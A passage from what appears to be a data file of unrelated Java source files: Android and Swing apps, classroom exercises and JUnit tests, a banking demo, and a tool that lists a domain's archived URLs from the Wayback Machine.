@Override\n        public void applyTransformation(float interpolatedTime, Transformation t) {\n            int targetTop = 0;\n            if (from != originalOffsetTop) {\n                targetTop = (from + (int)((originalOffsetTop - from) * interpolatedTime));\n       ",
    "package com.example.theflashlight;\n\nimport android.Manifest;\nimport android.content.Context;\nimport android.hardware.camera2.CameraAccessException;\nimport android.hardware.camera2.CameraManager;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.ImageButton;\nimport android.widget.Toast;\n\nimport androidx.activity.EdgeToEdge;\nimport androidx.appcompat.app.AppCompatActivity;\nimport androidx.core.graphics.Insets;\nimport androidx.core.view.ViewCompat;\nimport androidx.core.view.WindowInsetsCompat;\n\nimport com.karumi.dexter.Dexter;\nimport com.karumi.dexter.PermissionToken;\nimport com.karumi.dexter.listener.PermissionDeniedResponse;\nimport com.karumi.dexter.listener.PermissionGrantedResponse;\nimport com.karumi.dexter.listener.PermissionRequest;\nimport com.karumi.dexter.listener.single.PermissionListener;\n\npublic class MainActivity extends AppCompatActivity {\n\n    ImageButton imageButton;\n    boolean state;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        imageButton = findViewById(R.id.torchbtn);\n\n\n        Dexter.withContext(this).withPermission(Manifest.permission.CAMERA).withListener(new PermissionListener() {\n            @Override\n            public void onPermissionGranted(PermissionGrantedResponse permissionGrantedResponse) {\n                runFlashLight();\n\n            }\n\n            @Override\n            public void onPermissionDenied(PermissionDeniedResponse permissionDeniedResponse) {\n                Toast.makeText(MainActivity.this, \"Camera permission required\", Toast.LENGTH_SHORT).show();\n\n            }\n\n            @Override\n            public void onPermissionRationaleShouldBeShown(PermissionRequest permissionRequest, PermissionToken permissionToken) {\n\n            }\n        }).check();\n\n    }\n\n    private void runFlashLight() {\n        imageButton.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                if (!state)\n                {\n                    CameraManager cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);\n\n                    try {\n                        String cameraId = cameraManager.getCameraIdList()[0];\n                        cameraManager.setTorchMode(cameraId,true);\n                        state = true;\n                        imageButton.setImageResource(R.drawable.torch_on);\n                    }\n                    catch (CameraAccessException e)\n                    {}\n                }\n                else\n                {\n                    CameraManager cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);\n\n                    try {\n                        String cameraId = cameraManager.getCameraIdList()[0];\n                        cameraManager.setTorchMode(cameraId,false);\n                        state = false;\n                        imageButton.setImageResource(R.drawable.torch_off);\n                    }\n                    catch (CameraAccessException e)\n                    {}\n                }\n            }\n        });\n        \n    }\n}",
    "package com.campusdual.classroom;\n\npublic class Exercise05 {\n    public static void main(String[] args) {\n        checkLessOrGreaterEqual(1,2);\n        checkMultiply(2,2);\n        checkPositiveNegative(-2);\n    }\n\n    //TODO \u2193\n    // Si el valor es menor, tiene que devolver el siguiente mensaje: X es menor que Y\n    // Si el valor es mayor o igual, tiene que devolver el siguiente mensaje: X es mayor o igual que Y\n    public static void checkLessOrGreaterEqual(int n1, int n2) {\n        if(n1 < n2){\n            System.out.println(n1 + \" es menor que \" + n2);\n        }else if(n1 >= n2){\n            System.out.println(n1 + \" es mayor o igual que \" + n2);\n        }\n    }\n\n    //TODO \u2193\n    // Si es m\u00faltiplo, tiene que devolver el siguiente mensaje: X es m\u00faltiplo de Y\n    // Si no es m\u00faltiplo, tiene que devolver el siguiente mensaje: X no es m\u00faltiplo de Y\n    public static void checkMultiply(int n1, int n2) {\n        if(n1 % n2 == 0){\n            System.out.println(n1 + \" es m\u00faltiplo de \" + n2);\n        }else{\n            System.out.println(n1 + \" no es m\u00faltiplo de \" + n2);\n        }\n    }\n\n    //TODO \u2193\n    // Si es negativo, tiene que devolver el siguiente mensaje: X es negativo.\n    // Si es positivo o cero, tiene que devolver el siguiente mensaje: X es positivo.\n    public static void checkPositiveNegative(int num) {\n        if(num < 0){\n            System.out.println(num + \" es negativo.\");\n        }else {\n            System.out.println(num + \" es positivo.\");\n        }\n    }\n}\n",
    "package com.campusdual.classroom;\n\nimport org.junit.jupiter.api.AfterEach;\nimport org.junit.jupiter.api.BeforeEach;\nimport org.junit.jupiter.api.DisplayName;\nimport org.junit.jupiter.api.Test;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.PrintStream;\n\nimport static org.junit.jupiter.api.Assertions.*;\n\nclass Exercise07Test {\n\n    private final ByteArrayOutputStream outContent = new ByteArrayOutputStream();\n    private final ByteArrayOutputStream errContent = new ByteArrayOutputStream();\n    private final PrintStream originalOut = System.out;\n    private final PrintStream originalErr = System.err;\n\n    @BeforeEach\n    void setUp() {\n        this.outContent.reset();\n        this.errContent.reset();\n        System.setOut(new PrintStream(this.outContent));\n        System.setErr(new PrintStream(this.errContent));\n    }\n\n    @AfterEach\n    void tearDown() {\n        System.setOut(this.originalOut);\n        System.setErr(this.originalErr);\n    }\n\n\n    @Test\n    @DisplayName(\"Perform a search in a reverse list 10 first integers\")\n    void positionInAList() {\n        Exercise07.positionInAList(8);\n        boolean find = this.outContent.toString().contains(\" se encuentra en la posici\u00f3n: \");\n        this.outContent.reset();\n        assertTrue(find, \"Number exist in list\");\n        Exercise07.positionInAList(20);\n        boolean notFind = this.outContent.toString().contains(\" no se encuentra en la lista.\");\n        assertTrue(notFind, \"Number does not exist in list\");\n    }\n\n    @Test\n    @DisplayName(\"Sum the first N integers\")\n    void sumFirstNaturalNumbers() {\n        Exercise07.sumFirstNaturalNumbers(10);\n        boolean checkSum = this.outContent.toString().contains(\"55\");\n        assertTrue(checkSum, \"Sum is not correct\");\n\n    }\n\n    @Test\n    @DisplayName(\"Shows a list of N first integer numbers\")\n    void showFirstNaturalNumbers() {\n        int n1 = 20;\n        Exercise07.showFirstNaturalNumbers(n1);\n        boolean flag = true;\n        for (int i = 0; i<n1 ; i++){\n            if (!this.outContent.toString().contains(String.valueOf(i+1))){\n                flag = false;\n                break;\n            }\n        }\n        assertTrue(flag, \"Not contains all first\" + n1 + \"numbers\");\n    }\n}",
    "/*\n * Copyright (c) 2021 Abex\n * All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are met:\n *\n * 1. Redistributions of source code must retain the above copyright notice, this\n *    list of conditions and the following disclaimer.\n * 2. Redistributions in binary form must reproduce the above copyright notice,\n *    this list of conditions and the following disclaimer in the documentation\n *    and/or other materials provided with the distribution.\n *\n * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND\n * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED\n * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\n * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR\n * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES\n * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\n * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND\n * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\n * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n */\npackage com.plugins.children;\n\nimport net.runelite.client.RuneLite;\nimport net.runelite.client.callback.ClientThread;\nimport net.runelite.jshell.ShellPanel;\n\nimport javax.inject.Inject;\nimport javax.inject.Singleton;\nimport java.util.concurrent.ScheduledExecutorService;\n\n@Singleton\nclass ShellFrame extends DevToolsFrame\n{\n\tprivate final ShellPanel shellPanel;\n\n\t@Inject\n\tShellFrame(ClientThread clientThread, ScheduledExecutorService executor)\n\t{\n\t\tthis.shellPanel = new ShellPanel(executor)\n\t\t{\n\t\t\t@Override\n\t\t\tprotected void invokeOnClientThread(Runnable r)\n\t\t\t{\n\t\t\t\tclientThread.invoke(r);\n\t\t\t}\n\t\t};\n\t\tsetContentPane(shellPanel);\n\n\t\tsetTitle(\"RuneLite Shell\");\n\n\t\tpack();\n\t}\n\n\t@Override\n\tpublic void open()\n\t{\n\t\tshellPanel.switchContext(RuneLite.getInjector());\n\t\tsuper.open();\n\t}\n\n\t@Override\n\tpublic void close()\n\t{\n\t\tsuper.close();\n\t\tshellPanel.freeContext();\n\t}\n}\n",
    "/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n */\n\npackage com.mycompany.maquinadedoce;\n\nimport javax.swing.JOptionPane;\n\n/**\n *\n * @author USER\n */\npublic class MaquinaDeDoce {\n\n    public static int valor = 0;\n\n    public int getValor() {\n        return valor;\n    }\n\n    public void setValor(int valor) {\n        MaquinaDeDoce.valor = valor;\n    }\n\n    public void somaComVerif(int indice) {\n        switch (indice) {\n            case 1:\n                if (valor + 1 > 10) {\n                    JOptionPane.showMessageDialog(\n                            null,\n                            \"O saldo m\u00e1ximo possivel \u00e9 de R$10.00\",\n                            \"M\u00c1XIMO VALOR ATINGIDO\",\n                            1);\n                } else {\n                    valor += 1;\n                }\n                break;\n            case 2:\n                if (valor + 2 > 10) {\n                    JOptionPane.showMessageDialog(\n                            null,\n                            \"O saldo m\u00e1ximo possivel \u00e9 de R$10.00\",\n                            \"M\u00c1XIMO VALOR ATINGIDO\",\n                            1);\n                } else {\n                    valor += 2;\n                }\n                break;\n            case 5:\n                if (valor + 5 > 10) {\n                    JOptionPane.showMessageDialog(\n                            null,\n                            \"O saldo m\u00e1ximo possivel \u00e9 de R$10.00\",\n                            \"M\u00c1XIMO VALOR ATINGIDO\",\n                            1);\n                } else {\n                    valor += 5;\n                }\n                break;\n            default:\n                break;\n        }\n    }\n\n    public void pedirDoce(int indice) {\n        switch (indice) {\n            case 6:\n                if (valor < 6) {\n                    JOptionPane.showMessageDialog(\n                            null,\n                            \"Voc\u00ea n\u00e3o tem saldo para compra esse doce !\",\n                            \"Saldo Insuficiente !\",\n                            1);\n                } else {\n                    valor -= 6;\n                    JOptionPane.showMessageDialog(\n                            null,\n                            \"BOMBOM entrege :D aproveite !\",\n                            \"Pedido Feito !\",\n                            1);\n                }\n                break;\n            case 7:\n                if (valor < 7) {\n                    JOptionPane.showMessageDialog(\n                            null,\n                            \"Voc\u00ea n\u00e3o tem saldo para compra esse doce !\",\n                            \"Saldo Insuficiente !\",\n                            1);\n                } else {\n                    valor -= 7;\n                    JOptionPane.showMessageDialog(\n                            null,\n                            \"TRIDENT entrege :D aproveite !\",\n                            \"Pedido Feito !\",\n                            1);\n                }\n                break;\n            case 8:\n                if (valor < 8) {\n                    JOptionPane.showMessageDialog(\n                            null,\n                            \"Voc\u00ea n\u00e3o tem saldo para compra esse doce !\",\n                            \"Saldo Insuficiente !\",\n                            1);\n                } else {\n                    valor -= 8;\n                    JOptionPane.showMessageDialog(\n                            null,\n                            \"ALFAJOR entrege :D aproveite !\",\n                            \"Pedido Feito !\",\n                            1);\n                }\n                break;\n\n            default:\n                break;\n        }\n    }\n\n    public void resgatarSaldo() {\n        if (valor != 0) {\n            JOptionPane.showMessageDialog(\n                    null,\n                    \"Voc\u00ea est\u00e1 regatando R$\" + valor + \" de saldo.\",\n                    \"Resgate de Saldo\",\n                    1);\n            valor = 0;\n        } else {\n            JOptionPane.showMessageDialog(\n                    null,\n                    \"Voc\u00ea n\u00e3o tem saldo a ser resgatado.\",\n                    \"Resgate de Saldo\",\n                    1);\n        }\n    }\n}\n\n// LISTA CODIGO BACKUP\n\n// if (MaquinaDeDoce.getValor() >= 6) {\n// } else {\n// }\n \n// MaquinaDeDoce MaquinaDeDoce = new MaquinaDeDoce();\n",
    "package com.work.arouter_api.utils;\n\nimport static com.work.arouter_api.utils.Constants.AROUTER_SP_CACHE_KEY;\nimport static com.work.arouter_api.utils.Constants.LAST_VERSION_CODE;\nimport static com.work.arouter_api.utils.Constants.LAST_VERSION_NAME;\n\nimport android.content.Context;\nimport android.content.SharedPreferences;\nimport android.content.pm.PackageInfo;\nimport android.content.pm.PackageManager;\n\npublic class PackageUtils {\n    private static String NEW_VERSION_NAME;\n    private static int NEW_VERSION_CODE;\n\n    public static boolean isNewVersion(Context context){\n        PackageInfo packageInfo = getPackageInfo(context);\n        if (null != packageInfo){\n            String versionName = packageInfo.versionName;\n            int versionCode = packageInfo.versionCode;\n            SharedPreferences sharedPreferences = context.getSharedPreferences(AROUTER_SP_CACHE_KEY, Context.MODE_PRIVATE);\n            if (versionName.equals(sharedPreferences.getString(LAST_VERSION_NAME,null))\n            ||versionCode != sharedPreferences.getInt(LAST_VERSION_CODE,-1)){\n                NEW_VERSION_NAME = versionName;\n                NEW_VERSION_CODE = versionCode;\n                return true;\n            }else{\n                return false;\n            }\n        }else{\n            return true;\n        }\n    }\n    public static void updateVersion(Context context) {\n        if (!android.text.TextUtils.isEmpty(NEW_VERSION_NAME) && NEW_VERSION_CODE != 0) {\n            SharedPreferences sp = context.getSharedPreferences(AROUTER_SP_CACHE_KEY, Context.MODE_PRIVATE);\n            sp.edit().putString(LAST_VERSION_NAME, NEW_VERSION_NAME).putInt(LAST_VERSION_CODE, NEW_VERSION_CODE).apply();\n        }\n    }\n\n    private static PackageInfo getPackageInfo(Context context) {\n        PackageInfo packageInfo = null;\n        try {\n            packageInfo =   context.getPackageManager().getPackageInfo(context.getPackageName(), PackageManager.GET_CONFIGURATIONS);\n        } catch (Exception e) {\n\n        }\n        return packageInfo;\n    }\n}\n",
    "package org.Mouath;\n\nimport org.apache.commons.cli.*;\n\nimport java.io.*;\nimport java.net.URL;\nimport java.util.HashSet;\nimport java.util.Set;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\n\npublic class Main {\n\n\n    private static final Set<String> BLACKLIST = new HashSet<>();\n\n    static {\n        //  for param blacklist\n        BLACKLIST.add(\".jpg\");\n        BLACKLIST.add(\".jpeg\");\n        BLACKLIST.add(\".png\");\n        BLACKLIST.add(\".gif\");\n        BLACKLIST.add(\".pdf\");\n        BLACKLIST.add(\".svg\");\n        BLACKLIST.add(\".json\");\n        BLACKLIST.add(\".css\");\n        BLACKLIST.add(\".js\");\n        BLACKLIST.add(\".webp\");\n        BLACKLIST.add(\".woff\");\n        BLACKLIST.add(\".woff2\");\n        BLACKLIST.add(\".eot\");\n        BLACKLIST.add(\".ttf\");\n        BLACKLIST.add(\".otf\");\n        BLACKLIST.add(\".mp4\");\n        BLACKLIST.add(\".txt\");\n    }\n\n    public static void main(String[] args) {\n        System.out.println(ConsoleColors.GREEN_BOLD+\"\\n  ____                                       _____   _               _\\n\" +\n                \" |  _ \\\\    __ _   _ __    __ _   _ __ ___   |  ___| (_)  _ __     __| |   ___   _ __\\n\" +\n                \" | |_) |  / _` | | '__|  / _` | | '_ ` _ \\\\  | |_    | | | '_ \\\\   / _` |  / _ \\\\ | '__|\\n\" +\n                \" |  __/  | (_| | | |    | (_| | | | | | | | |  _|   | | | | | | | (_| | |  __/ | |\\n\" +\n                \" |_|      \\\\__,_| |_|     \\\\__,_| |_| |_| |_| |_|     |_| |_| |_|  \\\\__,_|  \\\\___| |_|\\n\" +\n                \"\\n\" +\n                \"\\n\\t\\t\\t\\t\\t\\t\\thttps://github.com/MouathA\");\n        Options options = new Options();\n        options.addOption(\"d\", \"domain\", true, \"scan domain and subdomains\");\n        options.addOption(\"o\", \"output\", true, \"output\");\n        options.addOption(\"p\", \"params\", false, \"extract URLs with parameters only\");\n\n        CommandLineParser parser = new DefaultParser();\n        try {\n            CommandLine cmd = parser.parse(options, args);\n\n            if (cmd.hasOption(\"d\") && cmd.hasOption(\"o\")) {\n                String domain = cmd.getOptionValue(\"d\");\n                String output = cmd.getOptionValue(\"o\");\n                boolean extractParamsOnly = cmd.hasOption(\"p\");\n\n                System.out.println(ConsoleColors.GREEN_BOLD + \"[+] Scanning domain and subdomains: \" + domain);\n                outputDP(domain, output, extractParamsOnly);\n                System.out.println(ConsoleColors.GREEN_BOLD + \"[*] Task completed successfully.\");\n                System.out.println(ConsoleColors.RESET);\n                System.exit(0);\n            } else {\n                throw new IllegalArgumentException(\"[-] Please provide both domain (-d) and output (-o) options.\");\n            }\n        } catch (ParseException | IOException | InterruptedException e) {\n            System.err.println(ConsoleColors.RED_BOLD + \"[!] Error: \" + e.getMessage());\n            System.out.println(ConsoleColors.RESET);\n            System.exit(1);\n        } catch (IllegalArgumentException e) {\n            System.err.println(ConsoleColors.RED_BOLD + \"[-] Error: \" + e.getMessage());\n            System.out.println(ConsoleColors.RESET);\n            System.exit(1);\n        }\n    }\n\n    private static void outputDP(String domain, String outputFilePath, boolean extractParamsOnly) throws IOException, InterruptedException {\n\n        URL url = new URL(\"https://web.archive.org/cdx/search/cdx?url=\" + domain + \"/*&output=txt&collapse=urlkey&fl=original&page=/%22\");\n        BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()));\n\n        BufferedWriter writer = new BufferedWriter(new FileWriter(outputFilePath));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            if (!shouldSkipURL(line)) {\n                if (extractParamsOnly) {\n                    Pattern pattern = Pattern.compile(\"(https?://\\\\S+\\\\?\\\\S+)\");\n                    Matcher matcher = pattern.matcher(line);\n                    while (matcher.find()) {\n                        String matchedUrl = matcher.group();\n                        writer.write(matchedUrl);\n                        writer.newLine();\n                    }\n                } else {\n                    writer.write(line);\n                    writer.newLine();\n                }\n            }\n        }\n\n        reader.close();\n        writer.close();\n        System.out.println(ConsoleColors.GREEN_BOLD + \"[*] URL content saved to \" + outputFilePath);\n        System.out.println(ConsoleColors.RESET);\n    }\n\n    private static boolean shouldSkipURL(String url) {\n        for (String extension : BLACKLIST) {\n            if (url.contains(extension)) {\n                return true;\n            }\n        }\n        return false;\n    }\n\n    private static class ConsoleColors {\n        public static final String RESET = \"\\u001B[0m\";\n        public static final String RED_BOLD = \"\\033[1;31m\";\n        public static final String GREEN_BOLD = \"\\033[1;32m\";\n    }\n}\n",
    "package oop.project.cli;\n\nimport org.junit.jupiter.api.Assertions;\nimport org.junit.jupiter.api.Nested;\nimport org.junit.jupiter.params.ParameterizedTest;\nimport org.junit.jupiter.params.provider.Arguments;\nimport org.junit.jupiter.params.provider.MethodSource;\n\nimport java.time.LocalDate;\nimport java.util.Map;\nimport java.util.Optional;\nimport java.util.stream.Stream;\n\npublic class ScenariosTests {\n\n    @Nested\n    class Add {\n\n        @ParameterizedTest\n        @MethodSource\n        public void testAdd(String name, String command, Object expected) {\n            test(command, expected);\n        }\n\n        public static Stream<Arguments> testAdd() {\n            return Stream.of(\n                Arguments.of(\"Add\", \"add 1 2\", Map.of(\"left\", 1, \"right\", 2)),\n                Arguments.of(\"Missing Argument\", \"add 1\", null),\n                Arguments.of(\"Extraneous Argument\", \"add 1 2 3\", null),\n                Arguments.of(\"Not A Number\", \"add one two\", null),\n                Arguments.of(\"Not An Integer\", \"add 1.0 2.0\", null)\n            );\n        }\n\n    }\n\n    @Nested\n    class Div {\n\n        @ParameterizedTest\n        @MethodSource\n        public void testSub(String name, String command, Object expected) {\n            test(command, expected);\n        }\n\n        public static Stream<Arguments> testSub() {\n            return Stream.of(\n                Arguments.of(\"Sub\", \"sub --left 1.0 --right 2.0\", Map.of(\"left\", 1.0, \"right\", 2.0)),\n                Arguments.of(\"Left Only\", \"sub --left 1.0\", null),\n                Arguments.of(\"Right Only\", \"sub --right 2.0\", Map.of(\"left\", Optional.empty(), \"right\", 2.0)),\n                Arguments.of(\"Missing Value\", \"sub --right\", null),\n                Arguments.of(\"Extraneous Argument\", \"sub --right 2.0 extraneous\", null),\n                Arguments.of(\"Misspelled Flag\", \"sub --write 2.0\", null),\n                Arguments.of(\"Not A Number\", \"sub --right two\", null)\n            );\n        }\n\n    }\n\n    @Nested\n    class Sqrt {\n\n        @ParameterizedTest\n        @MethodSource\n        public void testSqrt(String name, String command, Object expected) {\n            test(command, expected);\n        }\n\n        public static Stream<Arguments> testSqrt() {\n            return Stream.of(\n                Arguments.of(\"Valid\", \"sqrt 4\", Map.of(\"number\", 4)),\n                Arguments.of(\"Imperfect Square\", \"sqrt 3\", Map.of(\"number\", 3)),\n                Arguments.of(\"Zero\", \"sqrt 0\", Map.of(\"number\", 0)),\n                Arguments.of(\"Negative\", \"sqrt -1\", null)\n            );\n        }\n\n    }\n\n    @Nested\n    class Calc {\n\n        @ParameterizedTest\n        @MethodSource\n        public void testCalc(String name, String command, Object expected) {\n            test(command, expected);\n        }\n\n        public static Stream<Arguments> testCalc() {\n            return Stream.of(\n                Arguments.of(\"Add\", \"calc add\", Map.of(\"subcommand\", \"add\")),\n                Arguments.of(\"Sub\", \"calc sub\", Map.of(\"subcommand\", \"sub\")),\n                Arguments.of(\"Sqrt\", \"calc sqrt\", Map.of(\"subcommand\", \"sqrt\")),\n                Arguments.of(\"Missing\", \"calc\", null),\n                Arguments.of(\"Invalid\", \"calc unknown\", null)\n            );\n        }\n\n    }\n\n    @Nested\n    class Date {\n\n        @ParameterizedTest\n        @MethodSource\n        public void testDate(String name, String command, Object expected) {\n            test(command, expected);\n        }\n\n        public static Stream<Arguments> testDate() {\n            return Stream.of(\n                Arguments.of(\"Date\", \"date 2024-01-01\", Map.of(\"date\", LocalDate.of(2024, 1, 1))),\n                Arguments.of(\"Invalid\", \"date 20240401\", null)\n            );\n        }\n\n    }\n\n    private static void test(String command, Object expected) {\n        if (expected != null) {\n            var result = Scenarios.parse(command);\n            Assertions.assertEquals(expected, result);\n        } else {\n            //TODO: Update with your specific Exception class or whatever other\n            //error handling model you use to check for specific library issues.\n            Assertions.assertThrows(Exception.class, () -> {\n                Scenarios.parse(command);\n            });\n        }\n    }\n\n}\n",
    "import java.sql.*;\r\nimport java.util.*;\r\n\r\nimport javax.naming.spi.DirStateFactory.Result;\r\n\r\nclass Bank {\r\n    static Scanner s1 = new Scanner(System.in);\r\n    private static String acno, cname, actype;\r\n    private static int balance, amount;\r\n    static Connection con = null;\r\n    static {\r\n        try {\r\n            Class.forName(\"com.mysql.jdbc.Driver\");\r\n            con = DriverManager.getConnection(\"jdbc:mysql://localhost/bank?user=root&password=\");\r\n        } catch (Exception e) {\r\n        }\r\n    }\r\n\r\n    // RANDOM ACCOUNT NUMBER\r\n    public static String generateAcno() {\r\n        Random r1 = new Random();\r\n        int a = r1.nextInt(1000, 9999);\r\n        return \"HDFC\" + a;\r\n    }\r\n\r\n    public static void openAccount() {\r\n        acno = generateAcno();\r\n        System.out.println(\"Account number : \" + acno);\r\n        System.out.println(\"Enter name : \");\r\n        cname = s1.next();\r\n        System.out.println(\"Account type : \");\r\n        actype = s1.next();\r\n        System.out.println(\"Enter balance : \");\r\n        balance = s1.nextInt();\r\n        try {\r\n            PreparedStatement ps = con.prepareStatement(\"insert into customer values (?,?,?,?)\");\r\n            ps.setString(1, acno);\r\n            ps.setString(2, cname);\r\n            ps.setString(3, actype);\r\n            ps.setInt(4, balance);\r\n            int a = ps.executeUpdate();\r\n            if (a == 1) {\r\n                System.out.println(\"Record updated\");\r\n            } else {\r\n                System.out.println(\"Record not updated\");\r\n            }\r\n        } catch (Exception e) {\r\n            System.out.println(e);\r\n        }\r\n    }\r\n\r\n    public static void depositMoney() {\r\n        System.out.println(\"Enter account Number : \");\r\n        acno = s1.next();\r\n        System.out.println(\"Enter the amount to be deposit : \");\r\n        amount = s1.nextInt();\r\n        try {\r\n            PreparedStatement ps = con.prepareStatement(\"update customer set balance = balance + ? where acno=?\");\r\n            ps.setInt(1, amount);\r\n            ps.setString(2, acno);\r\n            int a = ps.executeUpdate();\r\n            if (a == 1) {\r\n                System.out.println(\"amount updated\");\r\n            } else {\r\n                System.out.println(\"account not found\");\r\n            }\r\n        } catch (Exception e) {\r\n        }\r\n    }\r\n\r\n    public static void withdrawMoney() {\r\n        System.out.println(\"Enter account Number : \");\r\n        acno = s1.next();\r\n        System.out.println(\"Enter the amount to be withdraw : \");\r\n        amount = s1.nextInt();\r\n        try {\r\n            PreparedStatement ps = con.prepareStatement(\"update customer set balance = balance - ? where acno=?\");\r\n            ps.setInt(1, amount);\r\n            ps.setString(2, acno);\r\n            int a = ps.executeUpdate();\r\n            if (a == 1) {\r\n                System.out.println(\"amount updated\");\r\n            } else {\r\n                System.out.println(\"account not found\");\r\n            }\r\n        } catch (Exception e) {\r\n        }\r\n    }\r\n\r\n    public static void tranferMoney() {\r\n        System.out.println(\"Enter account 1 (nikalne vala): \");\r\n        String acno1 = s1.next();\r\n        System.out.println(\"Enter account 2 (dalne vala): \");\r\n        String acno2 = s1.next();\r\n        System.out.println(\"Enter amount : \");\r\n        amount = s1.nextInt();\r\n        try {\r\n            PreparedStatement ps = con.prepareStatement(\"update customer set balance = balance - ? where acno=?\");\r\n            ps.setInt(1, amount);\r\n            ps.setString(2, acno1);\r\n            int a = ps.executeUpdate();\r\n            if (a == 1) {\r\n                PreparedStatement ps2 = con.prepareStatement(\"update customer set balance = balance + ? where acno=?\");\r\n                ps2.setInt(1, amount);\r\n                ps2.setString(2, acno2);\r\n                int b = ps2.executeUpdate();\r\n                if (b == 1) {\r\n                    System.out.println(\"amount updated\");\r\n                } else {\r\n                    System.out.println(\"account not found\");\r\n                }\r\n            } else {\r\n                System.out.println(\"account not found\");\r\n            }\r\n        } catch (Exception e) {\r\n        }\r\n    }\r\n\r\n    public static void searchAccount() {\r\n        System.out.println(\"Enter account number : \");\r\n        acno = s1.next();\r\n        try {\r\n            PreparedStatement ps = con.prepareStatement(\"select * from customer where acno=?\");\r\n            ps.setString(1, acno);\r\n            ResultSet rs = ps.executeQuery();\r\n            if (rs.next()) {\r\n                System.out.println(\"Account Number : \" + rs.getString(1));\r\n                System.out.println(\"Name : \" + rs.getString(2));\r\n                System.out.println(\"Account Type : \" + rs.getString(3));\r\n                System.out.println(\"Balance : \" + rs.getInt(4));\r\n                System.out.println(\"==============================================\");\r\n            } else {\r\n                System.out.println(\"Account not fou",
    "package C.G.Empleado;\n\nimport M.P.DE.Dao.IDaoExtendido;\nimport M.P.DE.Dao.IDaoGenerico;\nimport M.P.DE.Implements.EmpleadoDaoImpl;\nimport M.P.DE.Implements.UsuarioDaoImpl;\nimport M.P.DE.Transfer.Empleado;\nimport M.P.DE.Transfer.Usuario;\nimport V.I.P.Gerente.pnEmpleado;\nimport java.awt.HeadlessException;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\nimport javax.swing.JOptionPane;\nimport javax.swing.table.DefaultTableModel;\n\n/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template\n */\n/**\n *\n * @author H\u00e9ctor\n */\npublic final class contEmpleado implements ActionListener {\n\n    private int idEmpleado;\n    private IDaoGenerico<Empleado> crudDao;\n    private DefaultTableModel modelo;\n    private Object[] filaDatos;\n    private UsuarioDaoImpl usuario;\n    private final pnEmpleado vista;\n\n    public contEmpleado(pnEmpleado vista) {\n        this.vista = vista;\n        inicializarModelo();\n        configurarEventos();\n        inicializarDao();\n        inicializarDaoExternos();\n        limpiarTabla();\n        listar();\n\n    }\n\n    private void configurarEventos() {\n        vista.btnAgregar.addActionListener(this);\n        vista.btnNuevo.addActionListener(this);\n        vista.btnEliminar.addActionListener(this);\n        vista.btnActualizar.addActionListener(this);\n        EventosExternos();\n    }\n\n    public void EventosExternos() {\n\n        vista.tbMostrar.addMouseListener(new java.awt.event.MouseAdapter() {\n            @Override\n            public void mouseReleased(java.awt.event.MouseEvent evt) {\n                mostrarTabla(evt);\n            }\n        });\n\n        vista.txtBuscador.addKeyListener(new java.awt.event.KeyAdapter() {\n            @Override\n            public void keyReleased(java.awt.event.KeyEvent evt) {\n                buscar(evt);\n            }\n        });\n    }\n\n    private void inicializarModelo() {\n        modelo = new DefaultTableModel();\n    }\n\n    private void inicializarDaoExternos() {\n        usuario = new UsuarioDaoImpl();\n        comboUsuario();\n    }\n\n    private void inicializarDao() {\n        crudDao = new EmpleadoDaoImpl();\n    }\n\n    @Override\n    public void actionPerformed(ActionEvent e) {\n        if (e.getSource() == vista.btnAgregar) {\n            // Llama al m\u00e9todo agregar cuando se hace clic en el bot\u00f3n\n            agregar();\n        }\n        if (e.getSource() == vista.btnNuevo) {\n            // Llama al m\u00e9todo nuevo cuando se hace clic en el bot\u00f3n\n            limpiarTexto();\n            mensajeVacio();\n        }\n        if (e.getSource() == vista.btnActualizar) {\n            // Llama al m\u00e9todo agregar cuando se hace clic en el bot\u00f3n\n            actualizar();\n        }\n        if (e.getSource() == vista.btnEliminar) {\n            // Llama al m\u00e9todo agregar cuando se hace clic en el bot\u00f3n\n            eliminar();\n\n        }\n    }\n\n    public void mensajeVacio() {\n        vista.lblMensaje.setText(\"\");\n    }\n\n    private void comboUsuario() {\n        IDaoExtendido<Usuario> daoExtendido;\n        daoExtendido = new UsuarioDaoImpl();\n        vista.cbxUsuario.addItem(\"SELECCIONAR\");\n        for (Usuario usuario : daoExtendido.listar()) {\n            vista.cbxUsuario.addItem(usuario.getUsuario());\n        }\n    }\n\n    public void limpiarTabla() {\n        modelo = (DefaultTableModel) vista.tbMostrar.getModel();\n        modelo.getDataVector().removeAllElements();\n        vista.tbMostrar.removeAll();\n    }\n\n    public void listar() {\n        filaDatos = new Object[8];\n        try {\n            limpiarTabla();\n            UsuarioDaoImpl usuario = new UsuarioDaoImpl();\n            modelo = (DefaultTableModel) vista.tbMostrar.getModel();\n            for (Empleado p : 